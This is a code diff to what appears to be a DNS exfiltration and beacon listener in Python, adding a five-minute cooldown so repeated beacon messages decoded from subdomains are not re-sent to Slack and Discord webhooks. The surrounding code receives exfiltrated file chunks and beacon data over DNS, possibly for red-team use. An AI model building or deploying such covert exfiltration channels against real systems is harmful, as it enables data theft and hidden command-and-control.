@@ -1,4 +1,5 @@
 import os, base62
+from datetime import datetime, timedelta
 from dotenv import load_dotenv; load_dotenv()
 
 import modules.database as db
@@ -13,7 +14,10 @@ SLACK_WEBHOOK   = os.getenv("SLACK_WEBHOOK")
 DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK")
 
 WEBHOOKS = [ SLACK_WEBHOOK, DISCORD_WEBHOOK ]
+
+# For files, use a Database. Store recent messages in RAM. 
 SEEN_SHA = {  } # SHA : file_id
+COOLDOWN = {  } # Message : timestamp
 
 
 def handle_exfil( domain : str ):
@@ -63,7 +67,6 @@ def handle_exfil( domain : str ):
     
         SEEN_SHA[ sha_part ] = db.query_database( queries.get_fileid_with_sha, (sha_part,) )
         
-
     if sha_part in SEEN_SHA and id_part != 0:
         
         # Insert chunks
@@ -122,6 +125,8 @@ def handle_beacon( domain : str ):
     Will send the parsed message to Discord and/or Slack, depending on which webhooks are given.
     """
     
+    global COOLDOWN
+    
     #  Domain format for Beacon:
     #      DATA_PART.beacon.example.tld
     #  
@@ -134,10 +139,19 @@ def handle_beacon( domain : str ):
     data_part = subdomains[ 0 ]
     message   = str(base62.decodebytes( data_part ).decode())
     
-    Postoffice.send(
-        WEBHOOKS,
-        Postoffice.Slack_message( message ),
-        Postoffice.Discord_message( message )
-    )
+    first_appearance = True
+    if message in COOLDOWN:
+        first_appearance = False
+    
+    if message not in COOLDOWN:
+        COOLDOWN[ message ] = datetime.now()
+    
+    if (datetime.now() - COOLDOWN[ message ] >= timedelta(minutes=5)) or first_appearance:
+        COOLDOWN[ message ] = datetime.now()
+        Postoffice.send(
+            WEBHOOKS,
+            Postoffice.Slack_message( message ),
+            Postoffice.Discord_message( message )
+        )
     
     return
